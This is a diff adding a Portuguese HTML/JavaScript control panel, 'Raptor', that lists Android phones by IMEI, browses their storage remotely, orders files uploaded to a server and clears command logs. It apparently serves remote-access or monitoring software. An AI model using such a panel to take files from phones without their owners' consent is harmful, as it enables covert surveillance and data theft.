@@ -1,0 +1,648 @@
+<!DOCTYPE html>
+<html lang="pt-BR">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Painel de Controle Raptor</title>
+    <script src="https://cdn.tailwindcss.com"></script>
+    <style>
+        body {
+            font-family: "Inter", sans-serif;
+            background-color: #f3f4f6;
+            min-height: 100vh;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+        }
+        .container {
+            max-width: 1024px;
+            width: 100%;
+            padding: 1.5rem;
+        }
+        .card {
+            background-color: #ffffff;
+            border-radius: 0.75rem;
+            box-shadow: 0 4px 6px -1px rgba(0, 0, 0, 0.1), 0 2px 4px -1px rgba(0, 0, 0, 0.06);
+            padding: 1.5rem;
+            margin-bottom: 1.5rem;
+        }
+        .btn-primary {
+            background-color: #4f46e5;
+            color: #ffffff;
+            padding: 0.5rem 1rem;
+            border-radius: 0.375rem;
+            transition: background-color 0.2s;
+            white-space: nowrap;
+        }
+        .btn-primary:hover {
+            background-color: #4338ca;
+        }
+        .btn-danger {
+            background-color: #dc2626;
+            color: #ffffff;
+            padding: 0.5rem 1rem;
+            border-radius: 0.375rem;
+            transition: background-color 0.2s;
+            white-space: nowrap;
+        }
+        .btn-danger:hover {
+            background-color: #b91c1c;
+        }
+        .btn-secondary { /* Estilo para download/upload */
+            background-color: #3b82f6; /* Azul */
+            color: #ffffff;
+            padding: 0.5rem 1rem;
+            border-radius: 0.375rem;
+            transition: background-color 0.2s;
+            white-space: nowrap;
+        }
+        .btn-secondary:hover {
+            background-color: #2563eb; /* Azul mais escuro */
+        }
+        .file-item {
+            cursor: pointer;
+            padding: 0.75rem;
+            border-bottom: 1px solid #e5e7eb;
+            transition: background-color 0.2s;
+        }
+        .file-item:hover {
+            background-color: #f9fafb;
+        }
+        .file-item:last-child {
+            border-bottom: none;
+        }
+        .modal {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background-color: rgba(0, 0, 0, 0.5);
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            z-index: 1000;
+        }
+        .modal-content {
+            background-color: #ffffff;
+            padding: 2rem;
+            border-radius: 0.75rem;
+            box-shadow: 0 10px 15px -3px rgba(0, 0, 0, 0.1), 0 4px 6px -2px rgba(0, 0, 0, 0.05);
+            max-width: 400px;
+            width: 90%;
+            text-align: center;
+        }
+    </style>
+</head>
+<body class="p-6">
+    <div class="container mx-auto">
+        <h1 class="text-3xl font-bold text-gray-800 mb-6 text-center">Painel de Controle Raptor</h1>
+
+        <!-- Seção de Seleção de Dispositivos -->
+        <div class="card">
+            <h2 class="text-xl font-semibold text-gray-700 mb-4">Dispositivos Registrados</h2>
+            <div class="flex flex-col md:flex-row items-center gap-4">
+                <select id="deviceSelect" class="flex-grow p-2 border border-gray-300 rounded-md focus:ring-blue-500 focus:border-blue-500">
+                    <option value="">Selecione um dispositivo</option>
+                </select>
+                <button id="refreshDevicesBtn" class="btn-primary w-full md:w-auto">Atualizar Dispositivos</button>
+                <button id="clearExplorerResultsBtn" class="btn-danger w-full md:w-auto">Limpar Resultados Explorador</button>
+                <button id="clearExecutedCommandsBtn" class="btn-danger w-full md:w-auto">Limpar Comandos Executados</button> <!-- NOVO BOTÃO -->
+            </div>
+            <div id="selectedDeviceInfo" class="mt-4 p-3 bg-blue-50 border border-blue-200 text-blue-800 rounded-md hidden">
+                <p><strong>IMEI:</strong> <span id="displayImei"></span></p>
+                <p><strong>Modelo:</strong> <span id="displayModel"></span></p>
+                <p><strong>Versão Android:</strong> <span id="displayAndroidVersion"></span></p>
+                <p><strong>Última Atividade:</strong> <span id="displayLastSeen"></span></p>
+            </div>
+        </div>
+
+        <!-- Seção de Exploração de Arquivos -->
+        <div class="card">
+            <h2 class="text-xl font-semibold text-gray-700 mb-4">Explorador de Arquivos</h2>
+            <div class="flex items-center gap-4 mb-4">
+                <input type="text" id="currentPath" value="/storage/emulated/0" class="flex-grow p-2 border border-gray-300 rounded-md bg-gray-100" readonly>
+                <button id="goBackBtn" class="btn-primary">Voltar</button>
+                <button id="exploreFilesBtn" class="btn-primary">Explorar</button>
+            </div>
+            <div id="fileList" class="border border-gray-200 rounded-md overflow-hidden min-h-[150px]">
+                <p class="p-4 text-gray-500 text-center">Nenhum dispositivo selecionado ou nenhum arquivo encontrado.</p>
+            </div>
+            <p id="loadingMessage" class="mt-4 text-center text-gray-500 hidden">Carregando arquivos...</p>
+            <p id="errorMessage" class="mt-4 text-center text-red-500 hidden"></p>
+        </div>
+
+        <!-- Nova Seção: Arquivos Solicitados para Download (Uploads do Dispositivo) -->
+        <div class="card">
+            <h2 class="text-xl font-semibold text-gray-700 mb-4">Arquivos Enviados pelo Dispositivo</h2>
+            <div id="uploadedFilesList" class="border border-gray-200 rounded-md overflow-hidden min-h-[100px]">
+                <p class="p-4 text-gray-500 text-center">Nenhum arquivo enviado para o servidor ainda.</p>
+            </div>
+            <button id="refreshUploadedFilesBtn" class="btn-primary mt-4 w-full md:w-auto">Atualizar Lista de Uploads</button>
+        </div>
+    </div>
+
+    <!-- Modal de Confirmação para Limpar Resultados do Explorador -->
+    <div id="confirmationExplorerModal" class="modal hidden">
+        <div class="modal-content">
+            <h3 class="text-lg font-semibold mb-4">Confirmar Limpeza de Resultados do Explorador</h3>
+            <p class="mb-6">Tem certeza que deseja limpar TODOS os resultados do explorador de arquivos para o dispositivo <strong id="confirmExplorerImeiDisplay"></strong>?</p>
+            <div class="flex justify-center gap-4">
+                <button id="cancelClearExplorerBtn" class="btn-primary">Cancelar</button>
+                <button id="confirmClearExplorerBtn" class="btn-danger">Limpar</button>
+            </div>
+        </div>
+    </div>
+
+    <!-- Modal de Confirmação para Limpar Comandos Executados -->
+    <div id="confirmationCommandsModal" class="modal hidden">
+        <div class="modal-content">
+            <h3 class="text-lg font-semibold mb-4">Confirmar Limpeza de Comandos</h3>
+            <p class="mb-6">Tem certeza que deseja limpar TODOS os comandos EXECUTADOS ou FALHOS para o dispositivo <strong id="confirmCommandsImeiDisplay"></strong>?</p>
+            <div class="flex justify-center gap-4">
+                <button id="cancelClearCommandsBtn" class="btn-primary">Cancelar</button>
+                <button id="confirmClearCommandsBtn" class="btn-danger">Limpar Comandos</button>
+            </div>
+        </div>
+    </div>
+
+    <script>
+        const deviceSelect = document.getElementById('deviceSelect');
+        const refreshDevicesBtn = document.getElementById('refreshDevicesBtn');
+        const clearExplorerResultsBtn = document.getElementById('clearExplorerResultsBtn');
+        const clearExecutedCommandsBtn = document.getElementById('clearExecutedCommandsBtn'); // NOVO
+        const selectedDeviceInfo = document.getElementById('selectedDeviceInfo');
+        const displayImei = document.getElementById('displayImei');
+        const displayModel = document.getElementById('displayModel');
+        const displayAndroidVersion = document.getElementById('displayAndroidVersion');
+        const displayLastSeen = document.getElementById('displayLastSeen');
+        const currentPathInput = document.getElementById('currentPath');
+        const goBackBtn = document.getElementById('goBackBtn');
+        const exploreFilesBtn = document.getElementById('exploreFilesBtn');
+        const fileList = document.getElementById('fileList');
+        const loadingMessage = document.getElementById('loadingMessage');
+        const errorMessage = document.getElementById('errorMessage');
+
+        const confirmationExplorerModal = document.getElementById('confirmationExplorerModal');
+        const confirmExplorerImeiDisplay = document.getElementById('confirmExplorerImeiDisplay');
+        const cancelClearExplorerBtn = document.getElementById('cancelClearExplorerBtn');
+        const confirmClearExplorerBtn = document.getElementById('confirmClearExplorerBtn');
+
+        const confirmationCommandsModal = document.getElementById('confirmationCommandsModal'); // NOVO
+        const confirmCommandsImeiDisplay = document.getElementById('confirmCommandsImeiDisplay'); // NOVO
+        const cancelClearCommandsBtn = document.getElementById('cancelClearCommandsBtn'); // NOVO
+        const confirmClearCommandsBtn = document.getElementById('confirmClearCommandsBtn'); // NOVO
+
+        const uploadedFilesList = document.getElementById('uploadedFilesList');
+        const refreshUploadedFilesBtn = document.getElementById('refreshUploadedFilesBtn');
+
+
+        let devices = [];
+        let selectedImei = null;
+        let currentPathStack = [];
+
+        function formatDateTime(isoString) {
+            if (!isoString) return 'N/A';
+            const date = new Date(isoString);
+            return date.toLocaleString('pt-BR', {
+                year: 'numeric',
+                month: '2-digit',
+                day: '2-digit',
+                hour: '2-digit',
+                minute: '2-digit',
+                second: '2-digit'
+            });
+        }
+
+        async function fetchDevices() {
+            try {
+                const response = await fetch('../api/get_devices.php');
+                const data = await response.json();
+
+                if (response.ok) {
+                    devices = data;
+                    deviceSelect.innerHTML = '<option value="">Selecione um dispositivo</option>';
+                    devices.forEach(device => {
+                        const option = document.createElement('option');
+                        option.value = device.imei;
+                        option.textContent = `${device.model} (${device.imei}) - Última Atividade: ${formatDateTime(device.last_seen)}`;
+                        deviceSelect.appendChild(option);
+                    });
+
+                    if (selectedImei && devices.some(d => d.imei === selectedImei)) {
+                        deviceSelect.value = selectedImei;
+                        updateSelectedDeviceInfo();
+                    } else {
+                        selectedImei = null;
+                        selectedDeviceInfo.classList.add('hidden');
+                        fileList.innerHTML = '<p class="p-4 text-gray-500 text-center">Nenhum dispositivo selecionado ou nenhum arquivo encontrado.</p>';
+                        currentPathInput.value = '/storage/emulated/0';
+                        currentPathStack = [];
+                    }
+                } else {
+                    displayError(data.message || 'Erro ao buscar dispositivos.');
+                }
+            } catch (error) {
+                displayError('Erro de rede ao buscar dispositivos: ' + error.message);
+            }
+        }
+
+        function updateSelectedDeviceInfo() {
+            selectedImei = deviceSelect.value;
+            const device = devices.find(d => d.imei === selectedImei);
+
+            if (device) {
+                displayImei.textContent = device.imei;
+                displayModel.textContent = device.model;
+                displayAndroidVersion.textContent = device.android_version;
+                displayLastSeen.textContent = formatDateTime(device.last_seen);
+                selectedDeviceInfo.classList.remove('hidden');
+                fileList.innerHTML = '<p class="p-4 text-gray-500 text-center">Selecione um diretório para explorar.</p>';
+                currentPathInput.value = '/storage/emulated/0';
+                currentPathStack = [];
+                fetchUploadedFiles();
+            } else {
+                selectedImei = null;
+                selectedDeviceInfo.classList.add('hidden');
+                fileList.innerHTML = '<p class="p-4 text-gray-500 text-center">Nenhum dispositivo selecionado ou nenhum arquivo encontrado.</p>';
+                uploadedFilesList.innerHTML = '<p class="p-4 text-gray-500 text-center">Nenhum arquivo enviado para o servidor ainda.</p>';
+            }
+            hideError();
+        }
+
+        async function sendExploreCommand(path) {
+            if (!selectedImei) {
+                displayError('Por favor, selecione um dispositivo primeiro.');
+                return;
+            }
+
+            loadingMessage.classList.remove('hidden');
+            hideError();
+
+            try {
+                const formData = new FormData();
+                formData.append('imei', selectedImei);
+                formData.append('command', 'explore_files');
+                formData.append('path', path);
+
+                const response = await fetch('../api/send_command.php', {
+                    method: 'POST',
+                    body: formData
+                });
+                const data = await response.json();
+
+                if (response.ok && data.status === 'success') {
+                    displayMessage('Comando de exploração enviado. Aguardando resultados do dispositivo...');
+                    checkForFileExplorerResults(path);
+                } else {
+                    displayError(data.message || 'Erro ao enviar comando de exploração.');
+                }
+            } catch (error) {
+                displayError('Erro de rede ao enviar comando: ' + error.message);
+            } finally {
+                loadingMessage.classList.add('hidden');
+            }
+        }
+
+        async function checkForFileExplorerResults(path, attempt = 0) {
+            const MAX_ATTEMPTS = 10;
+            const DELAY = 5000;
+
+            if (attempt >= MAX_ATTEMPTS) {
+                displayError('O dispositivo não respondeu com os resultados do explorador de arquivos a tempo.');
+                return;
+            }
+
+            if (path !== currentPathInput.value && (currentPathStack.length === 0 || path !== currentPathStack[currentPathStack.length - 1])) {
+                 console.log('Caminho mudou, parando de checar resultados para o caminho anterior.');
+                 return;
+            }
+
+            try {
+                const response = await fetch(`../api/get_files.php?imei=${selectedImei}&path=${encodeURIComponent(path)}`);
+                const data = await response.json();
+
+                if (response.ok) {
+                    if (data.status === 'error' && data.message === 'Dispositivo não encontrado.') {
+                        displayError('Dispositivo não encontrado. Verifique se o aplicativo está rodando.');
+                        loadingMessage.classList.add('hidden');
+                        return;
+                    }
+
+                    if (data.length > 0) {
+                        displayFiles(data);
+                        loadingMessage.classList.add('hidden');
+                        displayMessage('Resultados do explorador de arquivos recebidos.');
+                    } else {
+                        if (attempt < MAX_ATTEMPTS - 1) {
+                            displayMessage(`Aguardando resultados... Tentativa ${attempt + 1}/${MAX_ATTEMPTS}`);
+                            setTimeout(() => checkForFileExplorerResults(path, attempt + 1), DELAY);
+                        } else {
+                            displayError('Nenhum arquivo encontrado neste diretório após várias tentativas.');
+                            loadingMessage.classList.add('hidden');
+                        }
+                    }
+                } else {
+                    displayError(data.message || 'Erro ao buscar resultados do explorador.');
+                    loadingMessage.classList.add('hidden');
+                }
+            } catch (error) {
+                displayError('Erro de rede ao buscar resultados: ' + error.message);
+                loadingMessage.classList.add('hidden');
+            }
+        }
+
+        function displayFiles(files) {
+            fileList.innerHTML = '';
+
+            if (files.length === 0) {
+                fileList.innerHTML = '<p class="p-4 text-gray-500 text-center">Nenhum arquivo encontrado neste diretório.</p>';
+                return;
+            }
+
+            files.forEach(file => {
+                const fileDiv = document.createElement('div');
+                fileDiv.classList.add('file-item', 'flex', 'items-center', 'gap-2', 'text-gray-700');
+
+                const icon = document.createElement('span');
+                icon.classList.add('text-lg');
+                if (file.isDirectory) {
+                    icon.innerHTML = '📁';
+                    fileDiv.onclick = () => navigateToDirectory(file.path);
+                    fileDiv.classList.add('font-semibold');
+                } else {
+                    icon.innerHTML = '📄';
+                    fileDiv.title = `Tamanho: ${formatBytes(file.size)}`;
+
+                    const downloadButton = document.createElement('button');
+                    downloadButton.textContent = 'Solicitar Upload';
+                    downloadButton.classList.add('btn-secondary', 'ml-auto', 'text-sm', 'py-1', 'px-2');
+                    downloadButton.onclick = (event) => {
+                        event.stopPropagation();
+                        requestFileUpload(file.path);
+                    };
+                    fileDiv.appendChild(downloadButton);
+                }
+
+                const fileName = document.createElement('span');
+                fileName.textContent = file.name;
+
+                fileDiv.prepend(icon);
+                fileDiv.prepend(fileName);
+                fileList.appendChild(fileDiv);
+            });
+        }
+
+        function formatBytes(bytes, decimals = 2) {
+            if (bytes === 0) return '0 Bytes';
+            const k = 1024;
+            const dm = decimals < 0 ? 0 : decimals;
+            const sizes = ['Bytes', 'KB', 'MB', 'GB', 'TB', 'PB', 'EB', 'ZB', 'YB'];
+            const i = Math.floor(Math.log(bytes) / Math.log(k));
+            return parseFloat((bytes / Math.pow(k, i)).toFixed(dm)) + ' ' + sizes[i];
+        }
+
+        function navigateToDirectory(path) {
+            if (selectedImei) {
+                if (currentPathStack.length === 0 || currentPathStack[currentPathStack.length - 1] !== currentPathInput.value) {
+                    currentPathStack.push(currentPathInput.value);
+                }
+                currentPathInput.value = path;
+                sendExploreCommand(path);
+            } else {
+                displayError('Selecione um dispositivo para explorar.');
+            }
+        }
+
+        function goBack() {
+            if (currentPathStack.length > 0) {
+                const previousPath = currentPathStack.pop();
+                currentPathInput.value = previousPath;
+                sendExploreCommand(previousPath);
+            } else {
+                if (currentPathInput.value !== '/storage/emulated/0') {
+                    currentPathInput.value = '/storage/emulated/0';
+                    sendExploreCommand('/storage/emulated/0');
+                } else {
+                    displayMessage('Já está no diretório raiz.');
+                }
+            }
+        }
+
+        async function clearExplorerResults() {
+            if (!selectedImei) {
+                displayError('Por favor, selecione um dispositivo primeiro para limpar os resultados.');
+                return;
+            }
+
+            confirmExplorerImeiDisplay.textContent = selectedImei;
+            confirmationExplorerModal.classList.remove('hidden');
+            hideError();
+        }
+
+        async function clearExecutedCommands() { // NOVA FUNÇÃO
+            if (!selectedImei) {
+                displayError('Por favor, selecione um dispositivo primeiro para limpar os comandos.');
+                return;
+            }
+
+            confirmCommandsImeiDisplay.textContent = selectedImei;
+            confirmationCommandsModal.classList.remove('hidden');
+            hideError();
+        }
+
+        async function requestFileUpload(filePath) {
+            if (!selectedImei) {
+                displayError('Por favor, selecione um dispositivo para solicitar o upload.');
+                return;
+            }
+
+            displayMessage(`Solicitando upload do arquivo "${filePath}" do dispositivo...`);
+            loadingMessage.classList.remove('hidden');
+
+            try {
+                const formData = new FormData();
+                formData.append('imei', selectedImei);
+                formData.append('command', 'upload_file');
+                formData.append('path', filePath);
+
+                const response = await fetch('../api/send_command.php', {
+                    method: 'POST',
+                    body: formData
+                });
+                const data = await response.json();
+
+                if (response.ok && data.status === 'success') {
+                    displayMessage('Comando de upload enviado. O dispositivo iniciará o envio em breve.');
+                } else {
+                    displayError(data.message || 'Erro ao solicitar upload do arquivo.');
+                }
+            } catch (error) {
+                displayError('Erro de rede ao solicitar upload: ' + error.message);
+            } finally {
+                loadingMessage.classList.add('hidden');
+            }
+        }
+
+        async function fetchUploadedFiles() {
+            if (!selectedImei) {
+                uploadedFilesList.innerHTML = '<p class="p-4 text-gray-500 text-center">Selecione um dispositivo para ver os arquivos enviados.</p>';
+                return;
+            }
+
+            uploadedFilesList.innerHTML = '<p class="p-4 text-gray-500 text-center">Carregando arquivos enviados...</p>';
+
+            try {
+                const response = await fetch(`../api/get_uploaded_files.php?imei=${selectedImei}`);
+                const data = await response.json();
+
+                if (response.ok) {
+                    if (data.status === 'success' && data.files.length > 0) {
+                        uploadedFilesList.innerHTML = '';
+                        data.files.forEach(file => {
+                            const fileDiv = document.createElement('div');
+                            fileDiv.classList.add('file-item', 'flex', 'items-center', 'gap-2', 'text-gray-700');
+
+                            const icon = document.createElement('span');
+                            icon.innerHTML = '📥';
+                            icon.classList.add('text-lg');
+
+                            const fileNameSpan = document.createElement('span');
+                            fileNameSpan.textContent = file.original_name;
+
+                            const downloadLink = document.createElement('a');
+                            downloadLink.href = file.download_url;
+                            downloadLink.textContent = 'Baixar';
+                            downloadLink.classList.add('btn-primary', 'ml-auto', 'text-sm', 'py-1', 'px-2');
+                            downloadLink.setAttribute('target', '_blank');
+                            downloadLink.setAttribute('download', file.original_name);
+
+                            fileDiv.appendChild(icon);
+                            fileDiv.appendChild(fileNameSpan);
+                            fileDiv.appendChild(downloadLink);
+                            uploadedFilesList.appendChild(fileDiv);
+                        });
+                    } else if (data.status === 'success' && data.files.length === 0) {
+                        uploadedFilesList.innerHTML = '<p class="p-4 text-gray-500 text-center">Nenhum arquivo enviado para o servidor ainda.</p>';
+                    } else {
+                         uploadedFilesList.innerHTML = `<p class="p-4 text-red-500 text-center">Erro ao carregar uploads: ${data.message || 'Desconhecido'}</p>`;
+                    }
+                } else {
+                    uploadedFilesList.innerHTML = `<p class="p-4 text-red-500 text-center">Erro de rede ao carregar uploads: ${response.statusText}</p>`;
+                    console.error("Erro ao buscar arquivos enviados:", error);
+                }
+            } catch (error) {
+                uploadedFilesList.innerHTML = `<p class="p-4 text-red-500 text-center">Erro de rede ao carregar uploads: ${error.message}</p>`;
+                console.error("Erro ao buscar arquivos enviados:", error);
+            }
+        }
+
+
+        function displayError(message) {
+            errorMessage.textContent = message;
+            errorMessage.classList.remove('hidden');
+            loadingMessage.classList.add('hidden');
+            errorMessage.classList.remove('text-green-600');
+            errorMessage.classList.add('text-red-500');
+            console.error('Erro no Painel:', message);
+        }
+
+        function displayMessage(message) {
+            errorMessage.textContent = message;
+            errorMessage.classList.remove('hidden');
+            errorMessage.classList.remove('text-red-500');
+            errorMessage.classList.add('text-green-600');
+            console.log('Mensagem do Painel:', message);
+            setTimeout(() => {
+                hideError();
+                errorMessage.classList.remove('text-green-600');
+                errorMessage.classList.add('text-red-500');
+            }, 5000);
+        }
+
+        function hideError() {
+            errorMessage.classList.add('hidden');
+        }
+
+        // Event Listeners
+        refreshDevicesBtn.addEventListener('click', fetchDevices);
+        deviceSelect.addEventListener('change', updateSelectedDeviceInfo);
+        exploreFilesBtn.addEventListener('click', () => sendExploreCommand(currentPathInput.value));
+        goBackBtn.addEventListener('click', goBack);
+        clearExplorerResultsBtn.addEventListener('click', clearExplorerResults);
+        clearExecutedCommandsBtn.addEventListener('click', clearExecutedCommands); // NOVO LISTENER
+        refreshUploadedFilesBtn.addEventListener('click', fetchUploadedFiles);
+
+        // Listeners para o modal de confirmação do Explorador
+        cancelClearExplorerBtn.addEventListener('click', () => {
+            confirmationExplorerModal.classList.add('hidden');
+        });
+
+        confirmClearExplorerBtn.addEventListener('click', async () => {
+            confirmationExplorerModal.classList.add('hidden');
+            loadingMessage.classList.remove('hidden');
+            hideError();
+
+            try {
+                const formData = new FormData();
+                formData.append('imei', selectedImei);
+
+                const response = await fetch('../api/clear_explorer_results.php', {
+                    method: 'POST',
+                    body: formData
+                });
+                const data = await response.json();
+
+                if (response.ok && data.status === 'success') {
+                    displayMessage(data.message);
+                    if (selectedImei) {
+                        fileList.innerHTML = '<p class="p-4 text-gray-500 text-center">Resultados limpos. Clique em "Explorar" para obter novos dados.</p>';
+                    }
+                } else {
+                    displayError(data.message || 'Erro ao limpar resultados do explorador.');
+                }
+            } catch (error) {
+                displayError('Erro de rede ao limpar resultados: ' + error.message);
+            } finally {
+                loadingMessage.classList.add('hidden');
+            }
+        });
+
+        // Listeners para o modal de confirmação de Comandos (NOVO)
+        cancelClearCommandsBtn.addEventListener('click', () => {
+            confirmationCommandsModal.classList.add('hidden');
+        });
+
+        confirmClearCommandsBtn.addEventListener('click', async () => {
+            confirmationCommandsModal.classList.add('hidden');
+            loadingMessage.classList.remove('hidden');
+            hideError();
+
+            try {
+                const formData = new FormData();
+                formData.append('imei', selectedImei);
+
+                const response = await fetch('../api/delete_executed_commands.php', { // NOVO ENDPOINT
+                    method: 'POST',
+                    body: formData
+                });
+                const data = await response.json();
+
+                if (response.ok && data.status === 'success') {
+                    displayMessage(data.message);
+                } else {
+                    displayError(data.message || 'Erro ao limpar comandos executados.');
+                }
+            } catch (error) {
+                displayError('Erro de rede ao limpar comandos: ' + error.message);
+            } finally {
+                loadingMessage.classList.add('hidden');
+            }
+        });
+
+
+        // Inicialização
+        fetchDevices();
+    </script>
+</body>
+</html>
